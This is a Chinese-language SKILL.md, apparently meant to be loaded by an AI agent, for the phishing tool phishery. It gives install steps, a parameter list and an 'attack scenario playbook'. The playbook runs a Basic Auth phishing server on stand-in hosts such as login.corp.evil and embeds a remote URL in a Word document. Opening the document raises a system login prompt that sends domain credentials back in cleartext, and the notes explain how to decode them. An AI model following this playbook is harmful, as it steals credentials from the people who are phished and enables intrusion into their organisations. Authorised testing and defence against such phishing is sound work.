---
name: phishery-basicauth
description: 渗透工具 skill:phishery 的安装、参数速查与攻击场景 playbook。当任务涉及 钓鱼与社会工程 需要调用 phishery 时使用。
---

# phishery

- 攻击大类:C08 钓鱼与社会工程
- 上游仓库:https://github.com/ryhanson/phishery
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
go install github.com/ryhanson/phishery@latest
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `phishery -u https://evil.com -c cert.pem -k key.pem` | 起 Basic Auth 钓鱼服务 |
| `-p 443` | 端口 |
| `-s 200` | 成功状态码伪装 |

## 攻击场景 Playbook

### 文档钓鱼收割域凭据

```bash
phishery -u https://login.corp.evil -c cert.pem -k key.pem
# Word 文档插 URL https://file.corp.evil/secret.docx → 弹 Basic Auth 框,凭据明文回传
```

## 注意事项

利用 Office 文档打开远程文件弹系统级认证框;SSL 证书要可信域名,凭据 base64 解码即得。
